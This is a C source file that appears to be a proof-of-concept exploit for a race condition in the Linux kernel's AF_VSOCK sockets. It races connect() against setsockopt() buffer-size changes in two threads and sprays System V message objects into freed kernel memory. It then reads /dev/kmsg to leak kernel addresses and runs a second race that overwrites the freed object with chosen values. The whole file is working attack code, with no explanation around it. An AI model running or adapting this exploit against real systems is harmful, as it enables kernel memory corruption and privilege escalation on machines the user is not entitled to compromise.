
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <unistd.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <errno.h>

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50
#define PAGELEN			0x1000

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;


void send_msg(){
	int result;
	int msqid;
    struct msgbuf {
        long mtype;       /* message type, must be > 0 */
        char mtext[16];    /* message data */
    } msgb;

	msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
	msgb.mtype = 16;
	strcpy(msgb.mtext, "###############");
	result = msgsnd(msqid, (void *) &msgb, sizeof(msgb.mtext), IPC_NOWAIT);
	if(result != 0) {
    	fprintf(stderr, "msgsnd failed! %d\n", errno);
	}

}


int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&barrier);
	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec < lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	struct timespec tp0;
	struct timespec tp;
	clock_gettime(CLOCK_MONOTONIC, &tp0);
	clock_gettime(CLOCK_MONOTONIC, &tp);

	while(tp0.tv_nsec > tp.tv_nsec - 35000){
		clock_gettime(CLOCK_MONOTONIC, &tp);
	}

	send_msg();
	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &tp);
	size = tp.tv_nsec;

	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&size, sizeof(unsigned long));

	return NULL;
}

struct arg_struct {
    void *arg1;
    int   arg2;
};

void *th_setsockopt_overwrite(void *arguments)
{
	struct arg_struct *args = (struct arg_struct *)arguments;
        int ret = -1;
        long lag_nsec = *((long *)args->arg1) * 1000;
        int i = args->arg2;
        struct timespec tp;
        unsigned long size = 0;

        ret = thread_sync(lag_nsec);
        if (ret != EXIT_SUCCESS) {
                tfail++;
                return NULL;
        }

        clock_gettime(CLOCK_MONOTONIC, &tp);
        size = tp.tv_nsec;

		unsigned long val;
		if(i % 2 == 0){
			val = 0x44444444;
		}else{
			val = 0x88888888;
		}
		
        setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                                                &val, sizeof(unsigned long)); ;

        return NULL;
}

void *th_connect_overwrite(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	send_msg();
	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };
	FILE *fp;
	char *line = NULL;
	char *rbx_string = "RBX";

	char *pch = NULL;
	char rbx[17];
	char rcx[17];
	size_t len = 0;
	ssize_t read;
	fp = fopen("/dev/kmsg", "r");
	int res = fseek(fp, 0, SEEK_END);

	if (fp == NULL)
		err_exit("[-] open /dev/kmsg");
	printf("[+] /dev/kmsg is opened\n");

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&size, sizeof(unsigned long));

	ret = pthread_barrier_init(&barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop < 2000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		//printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&th[0], NULL, th_connect, &tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&th[1], NULL, th_setsockopt, &tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}


/*
	for (loop = 0; loop < 2000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		//printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&th[0], NULL, th_connect_overwrite, &tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		args.arg1 = &tmo2;
		args.arg2 = loop;

		ret = pthread_create(&th[1], NULL, th_setsockopt_overwrite, (void *)&args);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}


	printf("[+] Loop done\n");
*/
	int found = 0;

	while(((read = getline(&line, &len, fp)) != 0) && found == 0){
//		printf("read ret %d\n", read);
		pch = strstr(line, rbx_string);
		if(pch){
			strncpy(rbx, pch+5, 16);
			strncpy(rcx, pch+27, 16);
			rbx[16] = '\0';
			rcx[16] = '\0';

			char rbx_null[17];
			strcpy(rbx_null, "0000000000000000");
			if(strncmp(rbx, rbx_null, 16) != 0){
				//printf("[+] RBX: %s\n", rbx);	// vsock_sock kernel address
				printf("[+] RCX, good msg_msg: %s\n", rcx);	// Freed virtio_vsock_sock kernel address
				found++;
			}
		}
	}


	ret = pthread_barrier_init(&barrier, NULL, 2);

	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	struct arg_struct args;

	printf("[ ] looping for overwriting ...\n");

	for (loop = 0; loop < 2000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		//printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&th[0], NULL, th_connect_overwrite, &tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		args.arg1 = &tmo2;
		args.arg2 = loop;

		ret = pthread_create(&th[1], NULL, th_setsockopt_overwrite, (void *)&args);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	printf("[+] overwrite done!\n");
	ret = close(vsock);
	if (ret)
		perror("[-] vsock close\n");

	res = fseek(fp, 0, SEEK_END);

	found = 0;

	while(((read = getline(&line, &len, fp)) != 0) && found == 0){
                printf("read ret %d\n", read);
                pch = strstr(line, rbx_string);
                if(pch){
                        strncpy(rbx, pch+5, 16);
                        strncpy(rcx, pch+27, 16);
                        rbx[16] = '\0';
                        rcx[16] = '\0';

                        char rbx_null[17];
                        strcpy(rbx_null, "0000000000000000");
                        if(strncmp(rbx, rbx_null, 16) != 0){
                                //printf("[+] RBX: %s\n", rbx); // vsock_sock kernel address
                                printf("[+] RCX, corrupted msg_msg: %s\n", rcx);     // Freed virtio_vsock_sock kernel address
                                found++;
                        }
                }
        }



	return 0;
}
